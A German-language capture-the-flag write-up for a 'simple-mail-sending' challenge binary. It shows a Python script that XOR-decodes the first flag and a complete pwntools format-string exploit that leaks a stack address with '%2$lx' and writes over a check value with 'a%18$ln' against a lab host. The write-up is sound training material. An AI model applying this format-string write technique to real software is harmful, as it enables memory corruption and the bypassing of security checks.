In der Funktion `show_digest` findet man folgenden Algorithmus. Dieser führt ein XOR mit unserem custom format durch. Da wir dieses kennen ist ein erneutes XOR mit diesem die Entschlüsselung der ersten Flagge.
```c
for (i = 0; i < 8; i = i + 1) {
    printf("%02x",(ulong)(uint)(int)custom_format[i]);
  }
  putchar(0x3a);
  for (j = 0; (ulong)(long)j < flaglen; j = j + 1) {
    printf("%02x",(ulong)(uint)(int)(char)(custom_format[j % 8] ^ __s[j]));
  }
```


```
###
If you want to share the format with the developers, use the following digest:
4141414141414100:272d20263a2f71771e7137723336333135721e70321e75642c702f1e367035681e3133702f35273a7b08330402061336703835152e3c
###
```

```python
key="4141414141414100"

flag="272d20263a2f71771e7137723336333135721e70321e75642c702f1e367035681e3133702f35273a7b08330402061336703835152e3c"

def to_hex(line):
  splitted = [int(line[i:i+2], 16).to_bytes(1) for i in range(0, len(line), 2)]
  return splitted

key = to_hex(key)
flag = to_hex(flag)

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

length = len(flag)
print (length)
for j  in range (0, len(flag)):

    print (byte_xor(key[j % 8], flag[j]).decode('utf-8'), end="")
```

Für die nächste Flagge ist ein typischer Stack-Address Leak nötig. Dieser kann mit der "Custom Format" Option und der Eingabe von `%2$lx` erreicht werden.
Anschließend muss man erneut eine E-Mail senden, und dort als `From` die Adresse ablegen (damit diese auf dem Stack liegt und wir diese für das Überschreiben nutzen können.).
Man wählt wieder "Custom Format" und schreibt mit `a%18$ln` eine 1 an die Position wo vorher 0x1337 stand. Dies manipuliert die darauf folgende Prüfung und die Flagge wird angezeigt.

```python
!/usr/bin/env python3

from pwn import *

exe = ELF("simple-mail-sending")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path], env={"FLAG1": "flag{testflag}"})
        if args.DEBU:
            gdb.attach(r, """
break *0x40172c
c
""")
    else:
        r = remote("10.65.52.126", 1024)

    return r

def scanfor1337(r):
    for i in range(0, 200):
        r.recvuntil(b"From: \n")
        r.sendline(b"AAAAAAAA")
        r.recvuntil(b"To: \n")
        r.sendline(b"012345678901234567")
        r.recvuntil(b"Subject: \n")
        r.sendline(b"012345678901234567")
        r.recvuntil(b"Message: \n")
        r.sendline(b"01234567890123456")
        r.recvuntil(b"Custom\n")
        r.sendline(b"3")
        r.recvuntil(b"Custom Format: \n")
        r.sendline(b"%"+bytes(str(i),'ascii')+b"$lx")
        r.recvuntil("BEGIN") 
        print(f"{i} ", r.recvuntil("END")) 
        r.sendline(b"y")

def exploit(r):
    offset=0xe8
    r.recvuntil(b"From: \n")
    r.sendline(b"0")
    r.recvuntil(b"To: \n")
    r.sendline(b"0")
    r.recvuntil(b"Subject: \n")
    r.sendline(b"0")
    r.recvuntil(b"Message: \n")
    r.sendline(b"0")
    r.recvuntil(b"Custom\n")
    r.sendline(b"3")
    r.recvuntil(b"Custom Format: \n")
    r.sendline(b"%2$lx")
    r.recvuntil("BEGIN\n") 
    addr = int(r.recvuntil("END\n")[:-5],16) + offset 
    r.sendline(b"y")
    r.recvuntil(b"From: \n")
    r.sendline(p64(addr))
    r.recvuntil(b"To: \n")
    r.sendline(b"0")
    r.recvuntil(b"Subject: \n")
    r.sendline(b"0")
    r.recvuntil(b"Message: \n")
    r.sendline(b"0")
    r.recvuntil(b"Custom\n")
    r.sendline(b"3")
    r.recvuntil(b"Custom Format: \n")
    r.sendline(b"a%18$ln")
    r.interactive()
def main():
    r = conn()
    #scanfor1337(r)
    exploit(r)
    r.interactive()
    r.close()
    


if __name__ == "__main__":
    main()
```
